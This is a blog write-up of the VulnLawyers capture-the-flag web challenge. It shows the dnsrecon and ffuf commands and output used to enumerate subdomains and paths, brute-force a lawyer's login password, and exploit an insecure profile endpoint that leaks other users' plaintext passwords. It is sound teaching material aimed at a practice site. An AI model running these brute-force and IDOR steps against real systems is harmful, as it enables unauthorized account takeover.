<!DOCTYPE html><html lang="en-US"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>CTF Challenge VulnLawyers Writeup</title><meta property="og:type" content="article"/><meta property="og:title" content="CTF Challenge VulnLawyers Writeup"/><meta property="og:description" content="A writeup for the VulnLawyers challenge from ctfchallenge.com"/><meta property="og:image" content="https://ctfchallenge.com/images/ctflogo-trans.png"/><meta name="twitter:card" content="summary_large_image"/><meta name="next-head-count" content="8"/><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"/><link rel="manifest" href="/site.webmanifest"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css" integrity="sha384-GvrOXuhMATgEsSwCs4smul74iXGOixntILdUW9XmUC6+HX0sLNAK3q71HotJqlAn" crossorigin="anonymous"/><script>if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {           document.documentElement.classList.add('dark')             } else {           document.documentElement.classList.remove('dark')             }</script><link rel="preload" href="/_next/static/css/c1d346a475f2dc76.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c1d346a475f2dc76.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-e70c6273bfe3f237.js" defer=""></script><script src="/_next/static/chunks/main-7e27d3add388512d.js" defer=""></script><script src="/_next/static/chunks/pages/_app-1ab394c7a000adfc.js" defer=""></script><script src="/_next/static/chunks/175675d1-0bdd1afc02fe15fb.js" defer=""></script><script src="/_next/static/chunks/985-e85a3fa4ed34a036.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bslug%5D-b523656a8b39cc3a.js" defer=""></script><script src="/_next/static/z_8vHzP3gM3WpBWa9iOcb/_buildManifest.js" defer=""></script><script src="/_next/static/z_8vHzP3gM3WpBWa9iOcb/_ssgManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><div class="flex flex-col min-h-screen"><header id="TOP" class="py-4 px-8"><div class="container max-w-3xl mx-auto flex justify-between"><a class="font-mono no-underline" href="/">~/</a><div class="font-mono my-auto text-accent-1-light dark:text-accent-1-dark"><span class="hidden sm:block ">cochaviz</span> <span class="block sm:hidden">üë®‚Äçüíª</span> </div><div class="flex gap-x-5"><a href="https://www.github.com/cochaviz"> github </a><a href="https://www.linkedin.com/in/cochaviz"> linkedin </a><button id="dark-mode-toggle-light" class="hover:border-accent-1-dark border-background-alt-dark bg-background-dark border-2 px-2 hidden dark:block">light mode</button><button id="dark-mode-toggle-dark" class="hover:border-accent-1-light border-background-alt-light bg-background-light border-2 px-2 block dark:hidden">dark mode</button></div></div></header><main class="container max-w-2xl"><div><a class="text-5xl font-sans no-underline fixed bottom-5 right-5 sm:bottom-10 sm:right-10 z-50 bg-background-light dark:bg-background-dark border-border-light dark:border-border-dark px-3 pb-2 border-2" href="#TOP">‚Üë</a><h1>CTF Challenge VulnLawyers Writeup</h1><article><p>[[toc]]</p>
<h2>A Little Disclaimer</h2>
<p>So you‚Äôre looking for answers, are ya? Well, I‚Äôve got them, but for a
price‚Ä¶ Namely a little bit of your time and attention:</p>
<p><strong>Please try the challenges yourself before checking the answers.</strong></p>
<p>CTF‚Äôs are notoriously ‚ÄòNP‚Äô prone. Once you‚Äôve seen the answer, it‚Äôs easy
to think you could‚Äôve come up with that. There is nothing wrong with
looking up answers, but try reflect on why you couldn‚Äôt figure it out. I
try to explain my thought process as best and brief as possible, but
figuring it out yourself is just the best feeling, so please give it
another go when you‚Äôre reading this! I‚Äôll not include any of the flags
to avoid people simply copying and pasting them.</p>
<p>Another note, I create these writeups as if speaking to myself. If my
manner of speaking seems a bit odd, you try talking to yourself without
sounding a little odd.</p>
<h2>Flags</h2>
<h3>Data Baby (Enumeration)</h3>
<p>The first flag can be found by performing a standard recon of the
subdomains of <code>vulnlawyers.co.uk</code>.</p>
<pre><code>$ dnsrecon -d vulnlawyers.co.uk -D ~/path/to/wordlists/subdomains.txt -t brt

[*] Using the dictionary file: /home/zohar/Documents/Playground/wordlists/subdomains.txt (provided by user)
[*] brt: Performing host and subdomain brute force against vulnlawyers.co.uk...
[+]     A data.vulnlawyers.co.uk 68.183.255.206
[+]     A www.vulnlawyers.co.uk 68.183.255.206
[+] 2 Records Found
</code></pre><p>Doing a http request with <code>curl</code>, or opening the domain in your browser
returns some info about the API and the first flag.</p>
<pre><code>$ curl http://data.vulnlawyers.co.uk -H &quot;Cookie: &lt;your_ctf_cookie&gt;&quot;

{&quot;name&quot;:&quot;VulnLawyers Website API&quot;,&quot;version&quot;:&quot;2.1.04&quot;,&quot;flag&quot;:&quot;[^FLAG^1337-DIY-1337^FLAG^]&quot;}
</code></pre><h3>Browsers are Evil (Enumeration)</h3>
<p>Now that we know the different domains that are available to us, let‚Äôs
do some recon on the different files and folders we have access to.</p>
<pre><code>$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;&quot; -u http://www.vulnlawyers.co.uk/FUZZ


        /&#x27;___\  /&#x27;___\           /&#x27;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________

css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
denied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 15ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]
login                   [Status: 302, Size: 1119, Words: 197, Lines: 31, Duration: 16ms]
</code></pre><p>Since we are (always) looking to escalate privileges, the <code>login</code>
endpoint looks especially interesting. Entering
<code>http://www.vulnlawyers.co.uk/login</code> in your browser will lead to a page
that says <strong>Acess is denied from your IP address</strong>. Shit. But take a
look at where we are <code>http://www.vulnlawyers.co.uk/denied</code>, we‚Äôve been
rerouted.</p>
<p>Let‚Äôs take a look at what happens with our request in the browser by
opening the developer tab (often <kbd>F12</kbd>, but if you didn‚Äôt know
that, you might want to look into some other challenges). Opening the
‚ÄòNetwork‚Äô tab (on Firefox, might be different on Chrome, Safari, etc.)
shows that we got a <code>302</code> code from the <code>/login</code> endpoint. This code
specifically tells a <em>browser</em> to reroute to a URL given by the
<code>Location</code> header <sup><a id="footnote-ref-1" href="#footnote-1" data-footnote-ref aria-describedby="footnote-label">1</a></sup>.</p>
<p>Browsers can do weird stuff, so let‚Äôs try to ask <code>curl</code> what‚Äôs up.</p>
<pre><code>$ curl www.vulnlawyers.co.uk/login -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;&quot;

[...]
  &lt;div class=&quot;alert alert-info&quot;&gt;
      &lt;p&gt;Access to this portal can now be found here &lt;a href=/lawyers-only&quot;&gt;/lawyers-only&lt;/a&gt;&lt;/p&gt;
      &lt;p&gt;[^FLAG^TRY_ME_B*TCH^FLAG^]&lt;/p&gt;
  &lt;/div&gt;
[...]
</code></pre><p>Well, would you look at that, a flag and a hidden endpoint :eyes:!
Christmas came early this year.</p>
<p>Opening the URL <code>http://www.vulnlawyers.co.uk/lawyers-only</code> will bring
us to a login screen. Now we can start gaining some unrequisited
privileges.</p>
<h3>Pipelining (Enumeration)</h3>
<p>The current goal is to log in, but we lack any user data. Thinking back,
the <code>data.vulnlawyers.co.uk</code> probably contains some of that precious
user data. Actually, we have yet to enumerate files and folders. Not you
tho, no, while we were trying to figure out how to access the login
page, you have of course started <code>ffuf</code>‚Äôing (that‚Äôs not a word, but it
should be) the domain. If you haven‚Äôt, keep in mind that reconnaissance
can sometimes take a long time. Minimize waiting and keep that noggin of
yours churning.</p>
<pre><code>$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;&quot; -u http://data.vulnlawyers.co.uk/FUZZ


        /&#x27;___\  /&#x27;___\           /&#x27;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________
users                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 21ms]
</code></pre><p>‚ÄôLo and behold, an endpoint called <code>/users</code>. Let‚Äôs employ <code>curl</code> and see
what it holds.</p>
<pre><code>curl data.vulnlawyers.co.uk/users -H &quot;Cooki e: ctfchallenge=&lt;your_ctf_cookie&gt;&quot;
{
  &quot;users&quot;: [
    {
      &quot;name&quot;: &quot;Yusef Mcclain&quot;,
      &quot;email&quot;: &quot;yusef.mcclain@vulnlawyers.co.uk&quot;
    },
    {
      &quot;name&quot;: &quot;Shayne Cairns&quot;,
      &quot;email&quot;: &quot;shayne.cairns@vulnlawyers.co.uk&quot;
    },
    {
      &quot;name&quot;: &quot;Eisa Evans&quot;,
      &quot;email&quot;: &quot;eisa.evans@vulnlawyers.co.uk&quot;
    },
    {
      &quot;name&quot;: &quot;Jaskaran Lowe&quot;,
      &quot;email&quot;: &quot;jaskaran.lowe@vulnlawyers.co.uk&quot;
    },
    {
      &quot;name&quot;: &quot;Marsha Blankenship&quot;,
      &quot;email&quot;: &quot;marsha.blankenship@vulnlawyers.co.uk&quot;
    }
  ],
  &quot;flag&quot;: &quot;[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]&quot;
}
</code></pre><p>And that‚Äôs our third flag. Onto exploitation!</p>
<h3>Higher and Higher (Exploitation)</h3>
<p>With a bit of luck, the attorneys are not technically inclined and use
simple passwords. After a bit of trail-and-error, we stumble upon
Jaskaran Lowe.</p>
<pre><code>ffuf -w ~/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;&quot; -u http://www.vulnlawyers.co.uk/lawyers-only-login -H &quot;Content-Type: applicati
on/x-www-form-urlencoded&quot; -d &#x27;email=jaskaran.lowe@vulnlawyers.co.uk&amp;password=FUZZ&#x27; -fr &quot;Invalid&quot;


        /&#x27;___\  /&#x27;___\           /&#x27;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________

summer                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
</code></pre><p>Logging in using browser gives us some info regarding a case, but more
importantly, the next flag!</p>
<h3>Some More Digging (Exploitation)</h3>
<p>We got a whole new section of the site to explore! Now, it might be
worth doing some more fuzzing on the path since we‚Äôve actually been
redirected to <code>.../lawyers-only-login</code> from <code>.../lawyers-only</code>, and
opening the <strong>Profile tab</strong> shows the path <code>.../lawyers-only-profile</code>.
Thus, we run <code>ffuf [...] http://www.vulnlawyers.co.uk/lawyers-only-FUZZ</code>
while further exploring the new domain. Spoiler alert: no interesting
results, but good habit nonetheless.</p>
<p>Looking at the <strong>Portal</strong> page shows a list of current cases. There is a
single case which is managed by <em>Shayne Cairns</em>, who is also the only
one who can perform actions on it. New goal: gain access to their
account. Opening the source code of the shows nothing interesting.</p>
<p>Taking a closer look at the <strong>Profile</strong> page shows us a place where we
can update our user data! Immediate thought: could we somehow use this
to update another user‚Äôs profile info? Let‚Äôs take a look at the request
payload using the <strong>Network</strong> tab in the dev tools.</p>
<pre><code>name=Jaskaran+Lowe&amp;email=jaskaran.lowe%40vulnlawyers.co.uk
</code></pre><p>Hmm, doesn‚Äôt seem like it. This leads to finding more info in the
request, like a new cookie called <code>token</code>. Makes sense, these requests
have to be authenticated, we should include this in any requests we do
via the terminal. Otherwise, nothing seems unusual.</p>
<p>Perhaps we can find something interesting in the source code. Let‚Äôs use
<code>curl</code> to retrieve the data.</p>
<pre><code>$ curl curl http://www.vulnlawyers.co.uk/lawyers-only-profile -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;; token=&lt;your_lawyer_cookie&gt;&quot;

&lt;script&gt;
    $.getJSON(&#x27;/lawyers-only-profile-details/4&#x27;,function(resp){
        $(&#x27;input[name=&quot;email&quot;]&#x27;).val( resp.email );
        $(&#x27;input[name=&quot;name&quot;]&#x27;).val( resp.name );
    });
&lt;/script&gt;
</code></pre><p>Oh would you look at that :sunglasses:! That‚Äôs how our info was already
filled in! For some reason they use some other source than the
<code>data.vulnlawyers.co.uk/users</code> endpoint which we‚Äôve seen before. Maybe
this contains different information.</p>
<pre><code>$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/4 -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;; token=&lt;your_lawyer_cookie&gt;&quot;

{
  &quot;id&quot;: 4,
  &quot;name&quot;: &quot;Jaskaran Lowe&quot;,
  &quot;email&quot;: &quot;jaskaran.lowe@vulnlawyers.co.uk&quot;,
  &quot;password&quot;: &quot;summer&quot;
}
</code></pre><p>Oh yes. Plain old passwords. Of course, they should have used the
<code>data.vulnlawyers.co.uk/users</code> API endpoint to retrieve that data. Let‚Äôs
access <em>Shayne Cairns</em> profile details with the user <code>id</code> which we can
find at <code>data.vulnlawyers.co.uk/users</code>. Small note: that id was
zero-indexed (Jaskaran‚Äôs <code>id</code> here is <code>4</code> while it was <code>3</code> before), this
one isn‚Äôt. Compensating for that gives the following request.</p>
<pre><code>$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/2 -H &quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;; token=&lt;your_lawyer_cookie&gt;&quot;

{
  &quot;id&quot;: 2,
  &quot;name&quot;: &quot;Shayne Cairns&quot;,
  &quot;email&quot;: &quot;shayne.cairns@vulnlawyers.co.uk&quot;,
  &quot;password&quot;: &quot;w&amp;#2a1^3p&quot;,
  &quot;flag&quot;: &quot;[^FLAG^NA_AH^FLAG^]&quot;
}
</code></pre><p>Flag number five!</p>
<h3>Finishing Up (Exploitation)</h3>
<p>This leaves us to the last flag. We now use the found credentials to log
in as Shayne Cairns, delete the case, and find the last flag :trophy:.</p>
<pre><code>Found](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)
</code></pre></article></div></main><footer class="mt-8 p-4 px-8"><div class="container max-w-3xl mx-auto flex justify-between"><div>¬© 2023 - Zohar Cochavi</div><a href="https://github.com/cochaviz/bunkernet">check the source</a></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"frontmatter":{"autoEqnLabels":false,"autoSectionLabels":false,"ccsDelim":", ","ccsLabelSep":"‚Äî","ccsTemplate":"$$i$$$$ccsLabelSep$$$$t$$","chapDelim":".","chapters":false,"chaptersDepth":1,"codeBlockCaptions":true,"cref":false,"crossrefYaml":"pandoc-crossref.yaml","date":"2022-09-14","eqLabels":"arabic","eqnBlockInlineMath":false,"eqnBlockTemplate":"\u003ctable\u003e\n\u003ccolgroup\u003e\n\u003ccol style=\"width: 90%\" /\u003e\n\u003ccol style=\"width: 10%\" /\u003e\n\u003c/colgroup\u003e\n\u003ctbody\u003e\n\u003ctr class=\"odd\"\u003e\n\u003ctd style=\"text-align: center;\"\u003e\u003cspan\nclass=\"math display\"\u003e\u003cem\u003et\u003c/em\u003e\u003c/span\u003e\u003c/td\u003e\n\u003ctd style=\"text-align: right;\"\u003e\u003cspan\nclass=\"math display\"\u003e\u003cem\u003ei\u003c/em\u003e\u003c/span\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n","eqnIndexTemplate":"($$i$$)","eqnInlineTemplate":"$$e$$$$equationNumberTeX$${$$i$$}","eqnPrefix":["eq.","eqns."],"eqnPrefixTemplate":"$$p$$¬†$$i$$","equationNumberTeX":"\\qquad","figLabels":"arabic","figPrefix":["fig.","figs."],"figPrefixTemplate":"$$p$$¬†$$i$$","figureTemplate":"$$figureTitle$$ $$i$$$$titleDelim$$ $$t$$","figureTitle":"Figure","lastDelim":", ","linkReferences":false,"listings":false,"listingTemplate":"$$listingTitle$$ $$i$$$$titleDelim$$ $$t$$","listingTitle":"Listing","listItemTitleDelim":".","lofItemTemplate":"$$lofItemTitle$$$$i$$$$listItemTitleDelim$$ $$t$$  \n","lofTitle":"# List of Figures\n","lolItemTemplate":"$$lolItemTitle$$$$i$$$$listItemTitleDelim$$ $$t$$  \n","lolTitle":"# List of Listings\n","lotItemTemplate":"$$lotItemTitle$$$$i$$$$listItemTitleDelim$$ $$t$$  \n","lotTitle":"# List of Tables\n","lstLabels":"arabic","lstPrefix":["lst.","lsts."],"lstPrefixTemplate":"$$p$$¬†$$i$$","metaDesc":"A writeup for the VulnLawyers challenge from ctfchallenge.com","metaImg":"https://ctfchallenge.com/images/ctflogo-trans.png","metaTitle":"CTF Challenge VulnLawyers Writeup","nameInLink":false,"numberSections":false,"pairDelim":", ","rangeDelim":"-","refDelim":", ","refIndexTemplate":"$$i$$$$suf$$","secHeaderDelim":null,"secHeaderTemplate":"$$i$$$$secHeaderDelim[n]$$$$t$$","secLabels":"arabic","secPrefix":["sec.","secs."],"secPrefixTemplate":"$$p$$¬†$$i$$","sectionsDepth":0,"subfigGrid":false,"subfigLabels":"alpha a","subfigureChildTemplate":"$$i$$","subfigureRefIndexTemplate":"$$i$$$$suf$$ ($$s$$)","subfigureTemplate":"$$figureTitle$$ $$i$$$$titleDelim$$ $$t$$. $$ccs$$","tableEqns":false,"tableTemplate":"$$tableTitle$$ $$i$$$$titleDelim$$ $$t$$","tableTitle":"Table","tags":["ctf","web","writeup"],"tblLabels":"arabic","tblPrefix":["tbl.","tbls."],"tblPrefixTemplate":"$$p$$¬†$$i$$","title":"CTF Challenge VulnLawyers Writeup","titleDelim":":"},"content":"\n\\[\\[toc\\]\\]\n\n## A Little Disclaimer\n\nSo you‚Äôre looking for answers, are ya? Well, I‚Äôve got them, but for a\nprice‚Ä¶ Namely a little bit of your time and attention:\n\n**Please try the challenges yourself before checking the answers.**\n\nCTF‚Äôs are notoriously ‚ÄòNP‚Äô prone. Once you‚Äôve seen the answer, it‚Äôs easy\nto think you could‚Äôve come up with that. There is nothing wrong with\nlooking up answers, but try reflect on why you couldn‚Äôt figure it out. I\ntry to explain my thought process as best and brief as possible, but\nfiguring it out yourself is just the best feeling, so please give it\nanother go when you‚Äôre reading this! I‚Äôll not include any of the flags\nto avoid people simply copying and pasting them.\n\nAnother note, I create these writeups as if speaking to myself. If my\nmanner of speaking seems a bit odd, you try talking to yourself without\nsounding a little odd.\n\n## Flags\n\n### Data Baby (Enumeration)\n\nThe first flag can be found by performing a standard recon of the\nsubdomains of `vulnlawyers.co.uk`.\n\n    $ dnsrecon -d vulnlawyers.co.uk -D ~/path/to/wordlists/subdomains.txt -t brt\n\n    [*] Using the dictionary file: /home/zohar/Documents/Playground/wordlists/subdomains.txt (provided by user)\n    [*] brt: Performing host and subdomain brute force against vulnlawyers.co.uk...\n    [+]     A data.vulnlawyers.co.uk 68.183.255.206\n    [+]     A www.vulnlawyers.co.uk 68.183.255.206\n    [+] 2 Records Found\n\nDoing a http request with `curl`, or opening the domain in your browser\nreturns some info about the API and the first flag.\n\n    $ curl http://data.vulnlawyers.co.uk -H \"Cookie: \u003cyour_ctf_cookie\u003e\"\n\n    {\"name\":\"VulnLawyers Website API\",\"version\":\"2.1.04\",\"flag\":\"[^FLAG^1337-DIY-1337^FLAG^]\"}\n\n### Browsers are Evil (Enumeration)\n\nNow that we know the different domains that are available to us, let‚Äôs\ndo some recon on the different files and folders we have access to.\n\n    $ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e\" -u http://www.vulnlawyers.co.uk/FUZZ\n\n\n            /'___\\  /'___\\           /'___\\       \n           /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n           \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n            \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n             \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n              \\/_/    \\/_/   \\/___/    \\/_/       \n\n    [...]\n    ________________________________________________\n\n    css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]\n    denied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 15ms]\n    images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]\n    js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]\n    login                   [Status: 302, Size: 1119, Words: 197, Lines: 31, Duration: 16ms]\n\nSince we are (always) looking to escalate privileges, the `login`\nendpoint looks especially interesting. Entering\n`http://www.vulnlawyers.co.uk/login` in your browser will lead to a page\nthat says **Acess is denied from your IP address**. Shit. But take a\nlook at where we are `http://www.vulnlawyers.co.uk/denied`, we‚Äôve been\nrerouted.\n\nLet‚Äôs take a look at what happens with our request in the browser by\nopening the developer tab (often \u003ckbd\u003eF12\u003c/kbd\u003e, but if you didn‚Äôt know\nthat, you might want to look into some other challenges). Opening the\n‚ÄòNetwork‚Äô tab (on Firefox, might be different on Chrome, Safari, etc.)\nshows that we got a `302` code from the `/login` endpoint. This code\nspecifically tells a *browser* to reroute to a URL given by the\n`Location` header [^1].\n\nBrowsers can do weird stuff, so let‚Äôs try to ask `curl` what‚Äôs up.\n\n    $ curl www.vulnlawyers.co.uk/login -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e\"\n\n    [...]\n      \u003cdiv class=\"alert alert-info\"\u003e\n          \u003cp\u003eAccess to this portal can now be found here \u003ca href=/lawyers-only\"\u003e/lawyers-only\u003c/a\u003e\u003c/p\u003e\n          \u003cp\u003e[^FLAG^TRY_ME_B*TCH^FLAG^]\u003c/p\u003e\n      \u003c/div\u003e\n    [...]\n\nWell, would you look at that, a flag and a hidden endpoint :eyes:!\nChristmas came early this year.\n\nOpening the URL `http://www.vulnlawyers.co.uk/lawyers-only` will bring\nus to a login screen. Now we can start gaining some unrequisited\nprivileges.\n\n### Pipelining (Enumeration)\n\nThe current goal is to log in, but we lack any user data. Thinking back,\nthe `data.vulnlawyers.co.uk` probably contains some of that precious\nuser data. Actually, we have yet to enumerate files and folders. Not you\ntho, no, while we were trying to figure out how to access the login\npage, you have of course started `ffuf`‚Äôing (that‚Äôs not a word, but it\nshould be) the domain. If you haven‚Äôt, keep in mind that reconnaissance\ncan sometimes take a long time. Minimize waiting and keep that noggin of\nyours churning.\n\n    $ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e\" -u http://data.vulnlawyers.co.uk/FUZZ\n\n\n            /'___\\  /'___\\           /'___\\       \n           /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n           \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n            \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n             \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n              \\/_/    \\/_/   \\/___/    \\/_/       \n\n    [...]\n    ________________________________________________\n    users                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 21ms]\n\n‚ÄôLo and behold, an endpoint called `/users`. Let‚Äôs employ `curl` and see\nwhat it holds.\n\n    curl data.vulnlawyers.co.uk/users -H \"Cooki e: ctfchallenge=\u003cyour_ctf_cookie\u003e\"\n    {\n      \"users\": [\n        {\n          \"name\": \"Yusef Mcclain\",\n          \"email\": \"yusef.mcclain@vulnlawyers.co.uk\"\n        },\n        {\n          \"name\": \"Shayne Cairns\",\n          \"email\": \"shayne.cairns@vulnlawyers.co.uk\"\n        },\n        {\n          \"name\": \"Eisa Evans\",\n          \"email\": \"eisa.evans@vulnlawyers.co.uk\"\n        },\n        {\n          \"name\": \"Jaskaran Lowe\",\n          \"email\": \"jaskaran.lowe@vulnlawyers.co.uk\"\n        },\n        {\n          \"name\": \"Marsha Blankenship\",\n          \"email\": \"marsha.blankenship@vulnlawyers.co.uk\"\n        }\n      ],\n      \"flag\": \"[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]\"\n    }\n\nAnd that‚Äôs our third flag. Onto exploitation!\n\n### Higher and Higher (Exploitation)\n\nWith a bit of luck, the attorneys are not technically inclined and use\nsimple passwords. After a bit of trail-and-error, we stumble upon\nJaskaran Lowe.\n\n    ffuf -w ~/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e\" -u http://www.vulnlawyers.co.uk/lawyers-only-login -H \"Content-Type: applicati\n    on/x-www-form-urlencoded\" -d 'email=jaskaran.lowe@vulnlawyers.co.uk\u0026password=FUZZ' -fr \"Invalid\"\n\n\n            /'___\\  /'___\\           /'___\\       \n           /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n           \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n            \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n             \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n              \\/_/    \\/_/   \\/___/    \\/_/       \n\n    [...]\n    ________________________________________________\n\n    summer                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]\n\nLogging in using browser gives us some info regarding a case, but more\nimportantly, the next flag!\n\n### Some More Digging (Exploitation)\n\nWe got a whole new section of the site to explore! Now, it might be\nworth doing some more fuzzing on the path since we‚Äôve actually been\nredirected to `.../lawyers-only-login` from `.../lawyers-only`, and\nopening the **Profile tab** shows the path `.../lawyers-only-profile`.\nThus, we run `ffuf [...] http://www.vulnlawyers.co.uk/lawyers-only-FUZZ`\nwhile further exploring the new domain. Spoiler alert: no interesting\nresults, but good habit nonetheless.\n\nLooking at the **Portal** page shows a list of current cases. There is a\nsingle case which is managed by *Shayne Cairns*, who is also the only\none who can perform actions on it. New goal: gain access to their\naccount. Opening the source code of the shows nothing interesting.\n\nTaking a closer look at the **Profile** page shows us a place where we\ncan update our user data! Immediate thought: could we somehow use this\nto update another user‚Äôs profile info? Let‚Äôs take a look at the request\npayload using the **Network** tab in the dev tools.\n\n    name=Jaskaran+Lowe\u0026email=jaskaran.lowe%40vulnlawyers.co.uk\n\nHmm, doesn‚Äôt seem like it. This leads to finding more info in the\nrequest, like a new cookie called `token`. Makes sense, these requests\nhave to be authenticated, we should include this in any requests we do\nvia the terminal. Otherwise, nothing seems unusual.\n\nPerhaps we can find something interesting in the source code. Let‚Äôs use\n`curl` to retrieve the data.\n\n    $ curl curl http://www.vulnlawyers.co.uk/lawyers-only-profile -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e; token=\u003cyour_lawyer_cookie\u003e\"\n\n    \u003cscript\u003e\n        $.getJSON('/lawyers-only-profile-details/4',function(resp){\n            $('input[name=\"email\"]').val( resp.email );\n            $('input[name=\"name\"]').val( resp.name );\n        });\n    \u003c/script\u003e\n\nOh would you look at that :sunglasses:! That‚Äôs how our info was already\nfilled in! For some reason they use some other source than the\n`data.vulnlawyers.co.uk/users` endpoint which we‚Äôve seen before. Maybe\nthis contains different information.\n\n    $ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/4 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e; token=\u003cyour_lawyer_cookie\u003e\"\n\n    {\n      \"id\": 4,\n      \"name\": \"Jaskaran Lowe\",\n      \"email\": \"jaskaran.lowe@vulnlawyers.co.uk\",\n      \"password\": \"summer\"\n    }\n\nOh yes. Plain old passwords. Of course, they should have used the\n`data.vulnlawyers.co.uk/users` API endpoint to retrieve that data. Let‚Äôs\naccess *Shayne Cairns* profile details with the user `id` which we can\nfind at `data.vulnlawyers.co.uk/users`. Small note: that id was\nzero-indexed (Jaskaran‚Äôs `id` here is `4` while it was `3` before), this\none isn‚Äôt. Compensating for that gives the following request.\n\n    $ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/2 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e; token=\u003cyour_lawyer_cookie\u003e\"\n\n    {\n      \"id\": 2,\n      \"name\": \"Shayne Cairns\",\n      \"email\": \"shayne.cairns@vulnlawyers.co.uk\",\n      \"password\": \"w\u0026#2a1^3p\",\n      \"flag\": \"[^FLAG^NA_AH^FLAG^]\"\n    }\n\nFlag number five!\n\n### Finishing Up (Exploitation)\n\nThis leaves us to the last flag. We now use the found credentials to log\nin as Shayne Cairns, delete the case, and find the last flag :trophy:.\n\n[^1]: [302\n    Found](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)\n"},"__N_SSG":true},"page":"/posts/[slug]","query":{"slug":"ctf-challenge-vulnlawyers"},"buildId":"z_8vHzP3gM3WpBWa9iOcb","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>